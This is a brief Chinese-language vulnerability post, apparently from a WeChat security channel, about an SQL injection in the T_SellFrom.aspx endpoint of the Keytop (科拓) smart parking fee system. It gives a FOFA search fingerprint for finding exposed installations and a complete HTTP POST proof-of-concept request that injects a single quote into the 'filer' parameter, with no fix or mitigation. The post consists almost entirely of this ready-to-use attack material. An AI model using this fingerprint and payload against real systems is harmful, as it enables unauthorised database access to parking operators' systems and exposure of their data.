#  科拓全智能停车收费系统的T_SellFrom.aspx接口存在SQL注入漏洞   
清晨  摸鱼划水   2025-04-22 03:52  
  
FOFA  
```
body="/KT_Css/qd_defaul.css"
```  
  
POC  
```
POST /KT_Admin/SellManage/T_SellFrom.aspx HTTP/1.1
Host: 
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 26

start=0&limit=20&filer='
```  
  
漏洞来源：  
  
https://blog.csdn.net/2403_89452275/article/details/144223439  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/qJ5apkMXic83ricxyvRPic2abacX0ymyjAWUCISkfibicIA6JsX6vCEat6BDnUnu5ibpphcLvYxXxu8gDHbGI2ibJzG0g/640?wx_fmt=jpeg&from=appmsg "")  
  
  
